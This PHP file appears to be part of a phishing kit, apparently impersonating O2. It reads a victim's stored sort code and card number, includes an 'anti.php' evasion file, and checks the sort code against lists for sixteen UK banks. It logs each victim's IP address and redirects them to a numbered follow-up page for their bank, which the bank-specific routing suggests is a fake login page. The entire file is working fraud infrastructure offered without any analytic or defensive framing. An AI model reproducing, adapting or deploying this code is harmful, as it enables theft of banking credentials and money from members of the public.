<?php
error_reporting(0);
session_start();
include "Config.php";
include 'anti.php';
require "Config.php";
$sort_code = $_SESSION['sc'];
$card_number = $_SESSION['xxx'];
$first_digit = substr($card_number, 0, 1);
$last_digits = substr($card_number, 15, 19);
$_SESSION['last4'] = $last_digits;
$ipclick = getenv("REMOTE_ADDR");

$source = file_get_contents('codes/hsbc_codes.txt');
$source2 = file_get_contents('codes/barclays_codes.txt');
$source3 = file_get_contents('codes/sains-codes.txt');
$source4 = file_get_contents('codes/metro-codes.txt');
$source5 = file_get_contents('codes/halifax_codes.txt');
$source6 = file_get_contents('codes/lloyds_codes.txt');
$source7 = file_get_contents('codes/natwest_codes.txt');
$source8 = file_get_contents('codes/rbs_codes.txt');
$source9 = file_get_contents('codes/santander_codes.txt');
$source10 = file_get_contents('codes/tsb_codes.txt');
$source11 = file_get_contents('codes/clydesdale_codes.txt');
$source12 = file_get_contents('codes/nation_codes.txt');
$source13 = file_get_contents('codes/citi_codes.txt');
$source14 = file_get_contents('codes/ulster-codes.txt');
$source15 = file_get_contents('codes/tesco-codes.txt');
$source16 = file_get_contents('codes/coop-codes.txt');

$array = explode("\r\n", $source);
$array2 = explode("\r\n", $source2);
$array3 = explode("\r\n", $source3);
$array4 = explode("\r\n", $source4);
$array5 = explode("\r\n", $source5);
$array6 = explode("\r\n", $source6);
$array7 = explode("\r\n", $source7);
$array8 = explode("\r\n", $source8);
$array9 = explode("\r\n", $source9);
$array10 = explode("\r\n", $source10);
$array11 = explode("\r\n", $source11);
$array12 = explode("\r\n", $source12);
$array13 = explode("\r\n", $source13);
$array14 = explode("\r\n", $source14);
$array15 = explode("\r\n", $source15);
$array16 = explode("\r\n", $source16);


if($logsresults == '1') {
if (in_array($sort_code, $array))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 1");

	die();

}

if (in_array($sort_code, $array2))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 2");
    die();

}

if (in_array($sort_code, $array5))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 3");
    die();

}

if (in_array($sort_code, $array6))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 4");
    die();

}

if (in_array($sort_code, $array7))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 5");
    die();

}

if (in_array($sort_code, $array8))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 6");
    die();
	
}

if (in_array($sort_code, $array9))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 8");
    die();
	
}

if (in_array($sort_code, $array10))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 9");
    die();
	
}

if (in_array($sort_code, $array11))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 10");
    die();

}

if (in_array($sort_code, $array12))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 11");
    die();

}

if (in_array($sort_code, $array3))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 13");
    die();

}
if (in_array($sort_code, $array4))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 14");
    die();

}

if (in_array($sort_code, $array13))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 12");
    die();

}
if (in_array($sort_code, $array14))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 16");
    die();

}
if (in_array($sort_code, $array15))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 15");
    die();

}
if (in_array($sort_code, $array16))  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-bank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header("Location: 17");
    die();

}


else  {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-nobank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
    header('Location: complete');
    die();
	

}
}
else {
    $click .= "$ipclick\n";
    $clickfile=fopen("logs/O2-nobank.txt","a");
    fwrite($clickfile,$click);
    fclose($clickfile);
	header('Location: complete');	
	}



?>